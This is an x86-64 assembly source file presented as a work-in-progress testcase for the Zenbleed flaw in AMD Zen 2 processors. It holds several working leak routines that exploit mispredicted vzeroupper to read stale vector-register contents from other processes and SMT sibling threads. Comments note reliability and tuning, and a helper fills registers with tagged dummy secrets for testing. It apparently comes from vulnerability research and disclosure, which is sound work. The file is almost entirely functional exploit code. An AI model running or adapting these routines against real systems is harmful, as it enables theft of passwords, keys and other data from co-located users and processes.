BITS 64

;
; This is a Work-in-Progress testcase for the Zenbleed vulnerability.
;
; Tavis Ormandy <taviso@google.com>
;

%define SYS_sched_yield 0x18
%define zl_hammer_secret 0x5345435245543432
%define zl_function_align 0x1000

%include "config.asm"


section .bss
section .data
    ;          FRRPUOZDIDPUOZDI
    mxctrl: dd 0110000000000000b
section .text

align zl_function_align

; This version performs very well on our test systems.
global zen2_leak_pepo_unrolled
zen2_leak_pepo_unrolled:
    %macro zenleak 1
        vpxor       ymm%1, ymm%1            ; clear ymm
        vpcmpistri  xmm%1, xmm%1, byte 0    ; just used for scheduling
        vcvtsi2ss   xmm%1, xmm%1, rax
        vmovupd     ymm%1, ymm%1
        jpe         %%overzero              ; any condition here works
        jpo         %%overzero
        vzeroupper
    %%overzero:
        vptest      ymm%1, ymm%1
        jz          %%nextreg
        vmovupd     [rdi], ymm%1
        jmp         .print
    %%nextreg:
    %endmacro
    xor         rax, rax
.repeat:
    %assign reg 15
    %rep 16
    zenleak reg
    %assign reg reg - 1
    %endrep
    jmp         .repeat
.print:
    ret
    hlt

align zl_function_align

; This version works better, but requires running the benchmark script to tune
; it per-SKU.
global zen2_leak_bench_pause
zen2_leak_bench_pause:
    %macro zentest 1
        vpxor       ymm%1, ymm%1            ; clear ymm
        vptest      ymm%1, ymm%1            ; just used for scheduling
        times       zl_loop_pause pause
        vcvtsi2ss   xmm%1, xmm%1, rax
        vmovupd     ymm%1, ymm%1
        jpe         %%overzero              ; any condition here works
        jpo         %%overzero
        vzeroupper
    %%overzero:
        vmovupd     ymm0, ymm%1
        vptest      ymm0, ymm0
        jnz         .print
    %endmacro
    vzeroall
    xor         rax, rax
.repeat:
    %assign reg 15
    %rep 16
    zentest reg
    %assign reg reg - 1
    %endrep
    jmp         .repeat
.print:
    vmovupd     [rdi], ymm0
    ret
    hlt

align zl_function_align

; This variant is not very fast, and doesn't seem to work across SMT very well.
; However, you can very reliably leak a chosen register on the same core, so
; that seems useful.
global zen2_leak_sls_insrb
zen2_leak_sls_insrb:
    vzeroall
    lea         r8, [rel .overzero]
    xor         rax, rax        ; tends to leak ymm{2,6}
    ;mov         rax, ' '        ; tends to leak ymm{1,5,9}
    sfence
    align       64
.repeat:
    lfence
    times       zl_loop_pause pause
    vpinsrb     xmm0, xmm0, eax, byte 111b
    vmovdqa     ymm0, ymm0
    jmp         r8
    nop
    vzeroupper
.overzero:
    vptest      ymm0, ymm0
    jz          .repeat
    vmovupd     [rdi], ymm0
    ret
    hlt


align zl_function_align

; This variant seems to perform very well on most systems, and leaks most
; registers reliably, some from thread sibling and some from same-core.
global zen2_leak_train_mm0
zen2_leak_train_mm0:
    ;ldmxcsr     [rel mxctrl]   ; This can make a modest improvement to benchmarks
    vzeroall
    xor         rax, rax
    movd        mm0, rax
    align       64
.restart:
    mov         rcx, 90
.again:
    dec         rcx
    cvtpi2pd    xmm4, mm0
    cvtpi2pd    xmm3, mm0
    cvtpi2pd    xmm2, mm0
    cvtpi2pd    xmm1, mm0
    cvtpi2pd    xmm0, mm0
    vmovdqa     ymm0, ymm0
    js          .overzero
    vzeroupper
.overzero:
    jns         .again
    vptest      ymm0, ymm0
    vptest      ymm0, ymm0      ; This shouldn't be necessary, but sometimes the flags are wrong without it.
    jz          .restart
    lfence                      ; Without this, sometimes I don't get the result.
    vmovdqu     [rdi], ymm0
    ret
    hlt

align zl_function_align

; This routine just puts some recognizable values in registers for testing.
global zen2_hammer_xmmregisters
zen2_hammer_xmmregisters:
    ; Add a recognizable tag so we know which register is leaking.
    %macro tagsecret 1
        mov     qword [rsp+24], tag
        vmovdqa ymm%1, [rsp]
    %endmacro
    vzeroall
    mov     rax, zl_hammer_secret
    and     rsp, ~(32 - 1)  ; align stack for movdqa
    push    rax
    push    rax
    push    rax
    push    rax
    %assign reg 15
    %rep 16
    %defstr regnum reg
    %strcat tag '@', regnum
    tagsecret reg
    %assign reg reg - 1
    %endrep
.again:
    pause
    ;mov     rax, SYS_sched_yield
    ;syscall
    jmp .again
    hlt
